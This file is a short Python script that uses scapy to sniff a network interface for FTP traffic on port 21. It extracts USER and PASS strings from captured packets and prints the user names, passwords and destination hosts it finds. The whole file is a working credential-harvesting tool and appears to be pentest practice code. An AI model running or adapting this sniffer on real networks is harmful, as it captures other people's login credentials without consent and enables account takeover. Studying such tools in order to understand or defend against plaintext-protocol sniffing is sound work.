#!/usr/bin/python3

from scapy.all import *
import socket as sc
from struct import *
import sys
from termcolor import colored	# use colored text output on the terminal
import optparse as op



# FUNCTION TO SNIFF FOR FTP PACKETS
# AND DIG OUT CREDENTIALS

def ftpSniff(pkt):

	dest = pkt.getlayer(IP).dst
	raw = pkt.sprintf("%Raw.load%")
	
	usr = re.findall('(?i)USER (.*)',raw)														# regular expression to look for pattern USER as asked when trying to login
	pwd = re.findall('(?i)PASS (.*)',raw)														# regular expression to look for pattern PASS as asked when trying to login
	
	if usr:
		print(colored("[!] Detected FTP Login to : " + str(dest), "green"))
		print(colored("[+] User account : " + usr[0].split('\\')[0], "green"))
	elif pwd:
		print(colored("[+] Password : " + pwd[0].split('\\')[0], "green"))




def main():

	parser = op.OptionParser("Usage: " + sys.argv[0] + " -i INTERFACE_NAME ")
	parser.add_option("-i", dest="interface", type="string", help="Interface to listen on")
	(options, args) = parser.parse_args()
	
	if options.interface == None:
		print(parser.usage)
		quit()
	else:
		conf.iface = options.interface
	try:
		print("[!] Starting the FTP Sniffer!")
		sniff(filter='tcp port 21', prn=ftpSniff)
	except KeyboardInterrupt:
		
		quit()
	finally:
		print("[!] Stopping the FTP Sniffer!")

main()
